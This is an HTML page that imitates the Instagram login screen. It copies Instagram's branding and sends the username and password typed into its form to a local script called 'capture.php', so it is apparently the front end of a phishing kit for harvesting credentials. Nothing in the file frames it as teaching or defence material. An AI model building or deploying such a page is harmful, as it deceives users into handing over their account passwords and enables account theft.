<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="./style.css">
</head>
<body>
    <div class="container">
        <h1>Instagram</h1>
        <form action="./capture.php" method="POST">
            <input type="text" name="email" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="or">
            <span>OR</span>
        </div>
        <div class="facebook-login">Log in with Facebook</div>
        <div class="forgot-password">Forgot password?</div>
        <div class="signup">
            Don’t have an account? <a href="#">Sign up</a>
        </div>
        <div class="download-links">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Get_it_from_Microsoft_Badge.svg" alt="Get it from Microsoft">
        </div>
    </div>
</body>
</html>
